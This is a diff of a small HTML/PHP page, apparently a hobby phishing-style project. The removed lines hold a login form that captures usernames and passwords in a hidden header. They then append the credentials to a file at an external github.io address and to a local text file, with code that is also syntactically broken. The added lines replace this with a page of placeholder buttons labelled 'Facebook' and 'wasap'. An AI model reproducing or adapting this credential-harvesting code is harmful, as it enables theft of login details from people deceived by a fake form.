@@ -1,42 +1,98 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<style>
-*{
-display: flex;
-flex-direction: column;
-align-item: center;
-background: #000;
-color: #32ff6f;
-text-align: center;
-}
-</style>
-<body>
-<header hidden>
-<?php
-if($_SERVER["REQUEST_METHOD"] == "POST"){
-$message = $_POST['message'];
-$password = $_POST['password'];
-    $data = fopen("https://details404.github.io/textDoc/new.txt", "a");
-    fwrite($data, "$message pass: $password);
-    fclose($data);
-file_put_contents("new.txt", "$message pass: $password");
-}
-?>
-
-</header>
-    <form method="POST">
-    <p>Username</p>
-    <input type="text" name="message" id="">
-<?php echo "message: $message"; ?>
-    <p>Password</p>
-    <input type="text" name="password">
-<br/>
-    <button type="submit">submit</button>
-    </form>
-</body>
+<html>
+    <head>
+        <meta name='viewport' content='width=device-width'/>
+        <meta name='theme-color' content='#000'/>
+    </head>
+    <style>
+        body{
+            background-image: linear-gradient(to right, #000, #32ff6f); /*url('./facebook/FB_IMG_17733088186379073.jpg');*/
+            background-repeat: no-repeat;
+            background-position: center top;
+            background-size: cover;
+            
+        }
+        .body .lrt{
+            border: 2px solid #f3f3f3;
+            border-radius: 25px;
+            width: 200px;
+            height: 400px;
+            position: relative;
+            top: 50px;
+            left: 80px;
+            color: #fff;
+        }
+        .body .qrt{
+            border: 2px solid #000;
+            border-top-left-radius: 25px;
+            border-top-right-radius: 25px;
+            position: relative;
+            top: 300px;
+            border-bottom-color: #32ff6f;
+        }
+        .qrt .inputField{
+            border-radius: 25px;
+            width: 140px;
+            
+        }
+        .qrt .send{
+            background: #000;
+            border-top-right-radius: 25px;
+            border-bottom-right-radius: 25px;
+            color: #fff;
+        }
+        .body .link{
+      position: relative;
+            top: 315px;      
+        }
+        .link button{
+            background: #000;
+            border-radius: 10px;
+        }
+        a{
+            text-decoration: none;
+            color: #fff;
+         
+        }
+    </style>
+    <body class='body'>
+        <div>
+            <div class='lrt'>
+                <div class='qrt'>
+                    <input class='inputField' type='text' /> 
+                    <button class='send'>send</button>
+                </div>
+                <div class='link'>
+                                        <button style='background: #000; color: #fff;'>
+                        <a href='' style='color: #fff;'>
+                            dummy
+                        </a>
+                    </button>
+                                                            <button class='btn2' style='background: #fff; color: #000;'>
+                                             
+                         Facebook                   
+                    </button>
+                                                            <button class='btn1' style='background: #32ff6f; color: #000;'>
+                            wasap
+                    </button>
+                     <div><div/>                                      <button style='background: #32ff6f; color: #000;'>
+                        <a href='' style='color: #000;'>
+                            dummy
+                        </a>
+                    </button>
+                                                            <button style='background: #000; color: #fff;'>
+                        <a href='' style='color: #fff;'>
+                            dummy
+                        </a>
+                    </button>
+                                                            <button style='background: #fff; color: #000;'>
+                        <a href='' style='color: #000;'>
+                            dummy
+                        </a>
+                    </button>
+                </div>
+            </div>
+        </div>
+        <script src='./JS/script.js'></script>
+    </body>
 </html>
+
